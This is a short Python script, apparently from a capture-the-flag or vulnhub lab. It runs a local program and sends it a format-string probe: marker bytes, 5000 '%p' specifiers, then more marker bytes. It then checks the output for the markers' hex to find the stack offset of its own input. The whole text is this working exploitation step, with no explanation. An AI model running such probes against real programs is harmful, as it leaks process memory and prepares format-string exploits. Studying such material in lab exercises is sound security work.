import subprocess

# Start the program as a subprocess
process = subprocess.Popen(['python3', './main.py'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

commit='vulnhub\naaaaaaaa'.encode()
for i in range(5000):
    commit+='-%p'.encode()
commit+='bbbbbbbb\n'.encode()
# Send input to the program and receive its output
output, _ = process.communicate(input=commit)

# Print the output
print(output.decode())
if '61616161' in output.decode():
    print('yes')
else:
    print('no')
if '62626262' in output.decode():
    print('yes')
else:
    print('no')
